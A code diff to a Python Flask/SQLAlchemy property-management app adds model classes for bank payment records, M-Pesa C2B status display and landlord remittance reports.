@@ -3116,7 +3646,7 @@ class SplitPaymentOp(SplitPayment,Base):
         db.session.commit()
 
     def combine_house_tenant_alt(self):
-        fname = self.tenant.name.split()[0]
+        fname = self.tenant.name.split()[0] if self.tenant.name else "Tenant"
         house =  self.house.name
         return f'<span class="text-gray-600">({house})</span> <span class="text-gray-900 font-weight-bold">{fname}</span>' 
 
@@ -3240,6 +3770,27 @@ class MpesaPaymentOp(MpesaPayment,Base):
     def update_status(self,status):
         self.claimed = status
         db.session.commit()
+
+class BankDataOp(BankData,Base):
+    """class for c2b model operations"""
+    def __init__(self,username,password,billNumber,billAmount,customerRefNumber,bankReference,transParticular,paymentMode,transDate,phoneNumber,debitAccount,debitCustName,data_type):
+        self.username = username
+        self.password = password
+        self.billNumber = billNumber
+        self.billAmount = billAmount
+        self.customerRefNumber = customerRefNumber
+        self.bankReference = bankReference
+        self.transParticular = transParticular
+        self.paymentMode = paymentMode
+        self.transDate = transDate
+        self.phoneNumber = phoneNumber
+        self.debitAccount = debitAccount
+        self.debitCustName = debitCustName
+        self.dataType = data_type
+
+    def fetch_record_by_ref(ref):
+        return BankDataOp.query.filter_by(bankReference=ref).first()
+
 class CtoBop(CtoB,Base):
     """class for c2b model operations"""
     def __init__(self,trans_id,trans_time,trans_amnt,trans_type,business_shortcode,bill_ref_num,invoice_num,msisdn,org_acc_bal,fname,lname):
@@ -3271,10 +3822,25 @@ class CtoBop(CtoB,Base):
         self.status = status
         db.session.commit()
 
+    def update_trans(self,trans):
+        self.trans_id = trans
+        db.session.commit()
+
     def get_date(self):
         paydate = self.post_date
         str_date = paydate.strftime("%d/%b/%y")
         return str_date
+
+    def get_status(self):
+        if self.status:
+            if self.status == "unclaimed":
+                status = '<span class="text-danger font-weight-bold">unclaimed</span>'
+            else:
+                status = '<span class="text-success">resolved</span>'
+        else:
+            status = '<span class="text-danger font-weight-bold"> ? </span>'
+
+        return status
 
     def view(self):
         return {
@@ -3288,8 +3854,78 @@ class CtoBop(CtoB,Base):
             'phone':self.msisdn,
             'fname':self.fname,
             'lname':self.lname,
+            'status':CtoBop.get_status(self),
             'date':CtoBop.get_date(self)
         }
+
+
+
+class LandlordRemittanceOp(LandlordRemittance,Base):
+    """class"""
+    def __init__(self,code,name,landlord,ll_balbf,t_balbf,rent,expected,actual,t_balcf,utilities,deposit,commission,remitted,ratio,ll_balcf,agent):
+        self.code = code
+        self.name = name
+        self.landlord = landlord
+
+        self.ll_balbf = ll_balbf
+
+        self.t_balbf = t_balbf
+        self.rent = rent
+        self.expected = expected
+        self.actual = actual
+        self.t_balcf = t_balcf
+
+        self.commission = commission
+
+        self.utilities = utilities
+        self.deposit = deposit
+
+        self.remitted = remitted
+        self.ratio = ratio
+
+        self.ll_balcf = ll_balcf
+        self.agent = agent
+        
+
+    def update_status(self,status):
+        self.status = status
+        db.session.commit()
+
+    def get_date(self):
+        str_date = self.date_remitted.strftime("%d/%b/%y")
+        return str_date
+
+
+    def view(self):
+        return {
+            'id':self.id,
+            'code':self.code,
+            'name':self.name,
+            'landlord':self.landlord,
+
+            'll_balbf':self.ll_balbf,
+
+            't_balbf':self.t_balbf,
+            'rent':self.rent,
+            'expected':self.expected,
+            'actual':self.actual,
+            't_balcf':self.t_balcf,
+
+            'utilities':self.utilities,
+            'deposit':self.deposit,
+
+            'commission':self.commission,
+
+            'remitted':self.remitted,
+            'ratio':self.ratio,
+            
+            'll_balcf':self.ll_balcf,
+
+            'agent':self.agent,
+            'status':self.status,
+            'date':LandlordRemittance.get_date(self)
+        }
+
 
 class MpesaRequestOp(MpesaRequest,Base):
     def __init__(self,checkoutrequestid,amount,phone,chargetype_string,tenant_id):
